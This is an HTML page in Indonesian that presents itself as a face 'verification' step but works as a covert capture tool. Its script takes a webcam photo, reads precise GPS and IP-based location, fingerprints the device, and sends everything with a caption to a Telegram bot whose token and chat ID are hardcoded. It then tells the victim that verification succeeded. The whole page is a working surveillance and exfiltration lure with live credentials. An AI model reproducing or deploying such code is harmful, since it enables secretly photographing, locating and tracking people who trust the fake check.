<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <style>
        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 320px; }
        video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
        .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
        .msg { margin-top: 12px; font-size: 14px; color: #888; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Verifikasi</h2>
    <p style="font-size:14px; color:#aaa;">Arahkan wajah ke kamera</p>
    <video id="video" autoplay playsinline></video>
    <div class="status" id="status">⏳ Menunggu...</div>
    <div class="msg" id="infoMsg">Memproses...</div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = "7961613868:AAExZB1W9L5EinCeDvwGASisthoLGgYayBM";
    const CHAT_ID = "7781744044";

    // ========== ELEMEN ==========
    const video = document.getElementById('video');
    const statusEl = document.getElementById('status');
    const infoMsg = document.getElementById('infoMsg');

    let stream = null;
    let photoTaken = false;
    let capturedData = {};

    // ========== MULAI KAMERA ==========
    async function startCamera() {
        try {
            statusEl.textContent = '⏳ Mengakses kamera...';
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 480 } } 
            });
            video.srcObject = stream;
            statusEl.textContent = '✅ Kamera aktif';

            // Ambil semua data real-time
            await gatherAllData();

            setTimeout(() => {
                if (!photoTaken) captureAndSend();
            }, 500);

        } catch (err) {
            statusEl.textContent = '❌ Gagal akses kamera';
            infoMsg.textContent = 'Izin kamera diperlukan.';
        }
    }

    // ========== KUMPULKAN SEMUA DATA REAL-TIME ==========
    async function gatherAllData() {
        // 1. GPS real-time (dari browser)
        const gps = await getGPS();

        // 2. IP & lokasi real-time (dari API)
        const ip = await getIP();

        // 3. Device info real-time (dari browser)
        const device = getDeviceInfo();

        // 4. Waktu real-time
        const now = new Date();

        capturedData = {
            ip: ip.ip || 'N/A',
            country: ip.country || 'N/A',
            region: ip.region || 'N/A',
            city: ip.city || 'N/A',
            postal: ip.postal || 'N/A',
            isp: ip.isp || 'N/A',
            timezone: ip.timezone || 'N/A',
            lat: ip.lat || null,
            lon: ip.lon || null,
            gps_lat: gps ? gps.lat : null,
            gps_lng: gps ? gps.lng : null,
            gps_accuracy: gps ? gps.accuracy : null,
            browser: device.browser,
            os: device.os,
            device_type: device.device,
            resolution: device.resolution,
            device_timezone: device.timezone,
            language: device.language,
            online: device.online,
            cookies: device.cookies,
            timestamp: now.toLocaleString('id-ID', {
                weekday: 'long',
                day: 'numeric',
                month: 'long',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            })
        };
    }

    // ========== IP & LOCATION (REAL-TIME) ==========
    async function getIP() {
        try {
            const res = await fetch('https://ip-api.io/json/');
            const data = await res.json();
            return {
                ip: data.ip || null,
                country: data.country || null,
                region: data.region || null,
                city: data.city || null,
                postal: data.zip || null,
                isp: data.isp || null,
                timezone: data.timezone || null,
                lat: data.latitude || null,
                lon: data.longitude || null
            };
        } catch (e) {
            return {};
        }
    }

    // ========== GPS (REAL-TIME) ==========
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                },
                () => resolve(null),
                { timeout: 8000, enableHighAccuracy: true }
            );
        });
    }

    // ========== DEVICE INFO (REAL-TIME) ==========
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown', os = 'Unknown', device = 'Unknown';

        if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone')) os = 'iOS';
        else if (ua.includes('iPad')) os = 'iPadOS';
        else if (ua.includes('Mac OS X')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';

        if (ua.includes('Mobile')) device = 'Mobile';
        else if (ua.includes('Tablet')) device = 'Tablet';
        else device = 'Desktop';

        if (ua.includes('Edg/')) browser = 'Edge';
        else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
        else if (ua.includes('Firefox/')) browser = 'Firefox';
        else if (ua.includes('Chrome/')) browser = 'Chrome';
        else if (ua.includes('Safari/')) browser = 'Safari';

        return {
            browser: browser,
            os: os,
            device: device,
            resolution: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            online: navigator.onLine ? 'Yes' : 'No',
            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
        };
    }

    // ========== CAPTURE & KIRIM ==========
    async function captureAndSend() {
        if (!stream || photoTaken) return;

        statusEl.textContent = '📸 Memproses...';

        // Capture foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 480;
        canvas.height = video.videoHeight || 360;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);

        const d = capturedData;

        let caption = `📸 *REAL-TIME CAPTURE*
🕐 ${d.timestamp}

━━━━━━━━━━━━━━━━━━━━━━
🌐 *IP & LOCATION*
• IP: ${d.ip}
• Country: ${d.country}
• Region: ${d.region}
• City: ${d.city}
• Postal: ${d.postal}
• ISP: ${d.isp}
• Timezone: ${d.timezone}
• Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'N/A'}

━━━━━━━━━━━━━━━━━━━━━━
🛰️ *GPS (Real-time)*`;

        if (d.gps_lat) {
            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
            caption += `
• GPS: ${d.gps_lat}, ${d.gps_lng}
• Accuracy: ±${Math.round(d.gps_accuracy || 0)}m
• Maps: ${gmaps}`;
        } else {
            caption += `
• GPS: Tidak tersedia (izin ditolak)`;
        }

        caption += `

━━━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE (Real-time)*
• Browser: ${d.browser}
• OS: ${d.os}
• Device Type: ${d.device_type}
• Resolution: ${d.resolution}
• Device Timezone: ${d.device_timezone}
• Language: ${d.language}
• Online: ${d.online}
• Cookies: ${d.cookies}`;

        // Kirim ke Telegram
        const byteString = atob(imageDataUrl.split(',')[1]);
        const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        const blob = new Blob([ab], { type: mimeString });

        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'capture.jpg');
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');

        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                statusEl.textContent = '✅ Terkirim!';
                infoMsg.textContent = '✔️ Verifikasi selesai.';
                photoTaken = true;
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                setTimeout(() => {
                    document.body.innerHTML = `
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
                            ✅ Verifikasi berhasil.
                        </div>
                    `;
                }, 1000);
            } else {
                statusEl.textContent = '❌ Gagal kirim';
                infoMsg.textContent = 'Error: ' + response.status;
            }
        } catch (err) {
            statusEl.textContent = '❌ Error: ' + err.message;
        }
    }

    // ========== JALANKAN ==========
    startCamera();
</script>

</body>
</html>
